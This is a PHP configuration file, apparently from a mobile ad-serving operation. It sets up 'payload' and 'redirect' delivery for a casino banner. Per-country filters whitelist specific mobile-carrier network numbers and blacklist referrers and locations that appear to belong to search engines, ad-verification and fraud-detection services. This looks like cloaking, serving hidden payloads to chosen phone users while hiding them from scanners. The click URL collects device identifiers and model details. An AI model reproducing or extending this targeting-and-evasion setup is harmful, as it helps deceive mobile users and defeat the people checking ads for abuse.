<?

define('PAYLOAD_CM',1);
define('PAYLOAD_REDIRECT',2);


/** +-----------------------+
 *  | FILTERING FOR PAYLOAD |
 *  +-----------------------+
 */
$cm_filter = Array(
    'ip_location' => Array(FILTER_FLAG_BLACK_LIST,'(ca|ny)'),
    /*
    'org_name'=>Array(),
    'org_domain'=>Array(),
    'ip_address'=>Array(),
    'ip_referrer'=>Array(),
    'ip_url'=>Array(),
    'ip_country'=>Array(),
    'ip_city'=>Array(),
    'ip_domain'=>Array(),
    'ip_zone_id'=>Array(),
    'device_user_agent'=>Array(),
    'device_qc'=>1,
    'device_server_qc'=>1,
    'randomize'=> .2, //percentage of valid targets to targer
    'target'=>Array(PAYLOAD_CM) //which payload to target*/
);

$pm_filter = Array(
    'ip_asn' => Array(FILTER_FLAG_WHITE_LIST,'(21928|20057|701|10507|7018|3651|22394|11486|6167|1239|2686|702|16586|7132|3371|2687|6614|2386|703|7046|797|3372|2688|8030|4185|11486|16572|23148|19973|12079|11303|3707|14551|2685)'),
    'ip_url' => Array(FILTER_FLAG_BLACK_LIST,'(w3sc|diatr|eoed|goog|api.ge|owndetec|test.ad|to.mx|bnmla|clari|ooxtra|sume)'),
    //'ip_hostname'=>Array(FILTER_FLAG_BLACK_LIST,'(md72736d0.tmodns.net)')
    //'ip_location' => Array(FILTER_FLAG_BLACK_LIST,'(ca|ny)'),
    'ip_location' => Array(FILTER_FLAG_BLACK_LIST,'(va)'),
);

$mx_filter = Array(
    //'ip_asn' => Array(FILTER_FLAG_WHITE_LIST,'(8151|28403|6332)'),
    'ip_asn' => Array(FILTER_FLAG_WHITE_LIST,'(8151|28403|6332|28548|8048|3352|28532|264987|4788|28554|6503|13999|11664|11888|28545|39832|15169)'),
    'ip_url' => Array(FILTER_FLAG_BLACK_LIST,'(w3sc|diatr|eoed|goog|api.ge|owndetec|test.ad|to.mx|bnmla|clari|ooxtra|sume)'),
    'ip_location' => Array(FILTER_FLAG_BLACK_LIST,'(va)'),
);

$th_filter = Array(
    'ip_asn' => Array(FILTER_FLAG_WHITE_LIST,'(24378)'),
    'ip_url' => Array(FILTER_FLAG_BLACK_LIST,'(w3sc|diatr|eoed|goog|api.ge|owndetec|test.ad|to.mx|bnmla|clari|ooxtra|sume)'),
    'ip_location' => Array(FILTER_FLAG_BLACK_LIST,'(va)'),
);
$de_filter = Array(
    'ip_asn' => Array(FILTER_FLAG_WHITE_LIST,'(3209|25135|36935|1273)'),
    'ip_url' => Array(FILTER_FLAG_BLACK_LIST,'(w3sc|diatr|eoed|goog|api.ge|owndetec|test.ad|to.mx|bnmla|clari|ooxtra|sume)'),
    'ip_location' => Array(FILTER_FLAG_BLACK_LIST,'(va)'),
);

$it_filter = Array(
    'ip_asn' => Array(FILTER_FLAG_WHITE_LIST,'(3269|16232|5609|6762|15433)'),
    'ip_url' => Array(FILTER_FLAG_BLACK_LIST,'(w3sc|diatr|eoed|goog|api.ge|owndetec|test.ad|to.mx|bnmla|clari|ooxtra|sume)'),
    'ip_location' => Array(FILTER_FLAG_BLACK_LIST,'(va)'),
);

$dtac_filter = Array(
    //'ip_asn'=>Array(FILTER_FLAG_WHITE_LIST,'(36351)'),
    'ip_asn' => Array(FILTER_FLAG_WHITE_LIST,'(133543|132032)'),
    'ip_url' => Array(FILTER_FLAG_BLACK_LIST,'(w3sc|diatr|eoed|goog|api.ge|owndetec|test.ad|to.mx|bnmla|clari|ooxtra|sume)'),
    'ip_location' => Array(FILTER_FLAG_BLACK_LIST,'(va)'),
);

$dtac_and_ais_filter = Array(
    //'ip_asn'=>Array(FILTER_FLAG_WHITE_LIST,'(36351)'),
    'ip_asn' => Array(FILTER_FLAG_WHITE_LIST,'(24378|133543|132032|17552|7470|133481|24378|131445|9587|38444|38082|7470|10089|9287|23717|23602|17724|17468|38443)'),
    'ip_url' => Array(FILTER_FLAG_BLACK_LIST,'(w3sc|diatr|eoed|goog|api.ge|owndetec|test.ad|to.mx|bnmla|clari|ooxtra|sume)'),
    'ip_location' => Array(FILTER_FLAG_BLACK_LIST,'(va)'),
);

$za_filter = Array(
    //
    'ip_asn' => Array(FILTER_FLAG_WHITE_LIST,'(2905|16637|9129|28698|12091|11569|24788|4571|4178|29975|36994|37311)'),
    'ip_url' => Array(FILTER_FLAG_BLACK_LIST,'(w3sc|diatr|eoed|goog|api.ge|owndetec|test.ad|to.mx|bnmla|clari|ooxtra|sume)'),
    'ip_location' => Array(FILTER_FLAG_BLACK_LIST,'(va)'),
);

$vodacom_filter = Array(
    //
    //'ip_asn' => Array(FILTER_FLAG_WHITE_LIST,'(36994|29975)'),
    'ip_country'=>Array(FILTER_FLAG_WHITE_LIST,'(za)'),
    'ip_asn'=> Array(FILTER_FLAG_BLACK_LIST,'(3356|11404|14127|47544|51290|12912)'),
    'ip_url' => Array(FILTER_FLAG_BLACK_LIST,'(w3sc|diatr|eoed|goog|api.ge|owndetec|test.ad|to.mx|bnmla|clari|ooxtra|sume)'),
    'ip_location' => Array(FILTER_FLAG_BLACK_LIST,'(va)'),
);

$fr_filter = Array(
    //
    //'ip_asn' => Array(FILTER_FLAG_WHITE_LIST,'(36994|29975)'),
    'ip_country'=>Array(FILTER_FLAG_WHITE_LIST,'(fr)'),
    'ip_url' => Array(FILTER_FLAG_BLACK_LIST,'(w3sc|diatr|eoed|goog|api.ge|owndetec|test.ad|to.mx|bnmla|clari|ooxtra|sume)'),
    'ip_location' => Array(FILTER_FLAG_BLACK_LIST,'(va)'),
);



$multi_filter = Array(
    //
    //'ip_asn' => Array(FILTER_FLAG_WHITE_LIST,'(36994|29975)'),
    'ip_country'=>Array(FILTER_FLAG_WHITE_LIST,'(fr|za)'),
    'ip_url' => Array(FILTER_FLAG_BLACK_LIST,'(w3sc|diatr|eoed|goog|api.ge|owndetec|test.ad|to.mx|bnmla|clari|ooxtra|sume)'),
    'ip_location' => Array(FILTER_FLAG_BLACK_LIST,'(va)'),
);

//
/**
 *  Check to see if 'filter' is event set, iterate through the keys and see if they are set.
 */


$cm_banner = Array(
    /** +-----------------------------------------+
     *  | ######### - #########
      - 320x50 |
     *  +-----------------------------------------+
     *  HTML BANNER PREVIEW:#########
     *  TAG SOURCE: #########
     */
    'dd-320x50'=>Array(
        'network'=>NETWORK_TAPSOMNIA,
        'name'=>'Double Down Casino',
        'advertiser'=>'igt',
        'is_cm'=>false,
        'is_redirect'=>false,
        'sdk_encryption_level'=>2,
        'images'=>Array(
            PLATFORM_ANDROID =>
                Array(
                    'img_1.png'             =>'#########',
                    'img_2.png'             =>'#########',
                    'img_3.png'             =>'#########',
                    'icon_1.png'            =>'#########',
                    'img_background.png'    =>'#########',
                    'img_background2.png'   =>'#########',
                    'img_background3.png'   =>'#########'
                ),
            PLATFORM_IOS =>
                Array(
                    'img_1.png'             =>'#########',
                    'img_2.png'             =>'#########',
                    'img_3.png'             =>'#########',
                    'icon_1.png'            =>'#########',
                    'img_background.png'    =>'#########',
                    'img_background2.png'   =>'#########',
                    'img_background3.png'   =>'#########'
                ),
        ),
        'width'=>320,
        'height'=>50,
        'click_url'=>'#########?pln={pln}&pid={plid}&crid={crid}&campid={campaign}&uid={uid_deviceid}&pln={pln}&brand={device_vendor}&model={device_model}&os={os}&cid={clickid}',
        'video_url'=>'http://www.youtubeinmp4.com/redirect.php?video=jF5E7Lsw764'
    ),


);